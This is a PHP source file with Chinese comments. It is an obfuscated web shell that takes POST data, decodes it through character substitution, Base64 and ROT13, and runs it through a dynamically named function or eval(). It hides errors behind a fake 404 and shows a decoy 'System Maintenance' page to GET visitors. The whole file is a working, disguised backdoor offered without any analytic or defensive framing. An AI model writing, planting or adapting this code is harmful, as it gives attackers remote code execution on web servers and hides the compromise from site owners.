<?php
// 动态函数名生成
class SystemUtils {
    public static function getProcessor() {
        $prefix = substr(md5('kernel_subsystem'), 8, 5);
        $chars = range('a', 'z');
        foreach ($chars as $char) {
            if ($char === chr(ord('m'))) {
                return $prefix . $char;
            }
        }
        return null;
    }
}

// 多重编码解码器
class DataDecoder {
    private static $mapping = [
        "|" => "a", "!" => "b", "@" => "c", "_" => "d",
        "#" => "e", "$" => "f", "%" => "g", "^" => "h",
        "&" => "i", "*" => "j", "(" => "k", ")" => "l"
    ];
    
    public static function decode($input) {
        // 第一层：字符替换
        $step1 = strtr($input, array_flip(self::$mapping));
        
        // 第二层：Base64解码
        $step2 = base64_decode($step1);
        
        // 第三层：ROT13解码（可选）
        if (strlen($step2) > 10) {
            $step2 = str_rot13($step2);
        }
        
        return $step2;
    }
}

// 主执行逻辑
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 动态获取参数名
    $param1 = 'd' . 'at' . 'a';
    $param2 = substr('command_input', 0, 4) . '_' . 'data';
    
    // 从多个可能的位置获取数据
    $encodedData = $_POST[$param1] ?? $_POST[$param2] ?? '';
    
    if (!empty($encodedData)) {
        try {
            // 解码数据
            $decodedData = DataDecoder::decode($encodedData);
            
            // 动态执行方法
            $processor = SystemUtils::getProcessor();
            if ($processor && function_exists($processor)) {
                $result = $processor($decodedData);
                echo "<pre>" . htmlspecialchars($result) . "</pre>";
            } else {
                // 备用执行方式
                eval("?>".$decodedData);
            }
        } catch (Exception $e) {
            // 静默处理错误
            header("HTTP/1.0 404 Not Found");
        }
    }
}

// 伪装成正常页面
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo "<!-- Page under construction -->";
    echo "<html><body><h1>System Maintenance</h1></body></html>";
}
?>
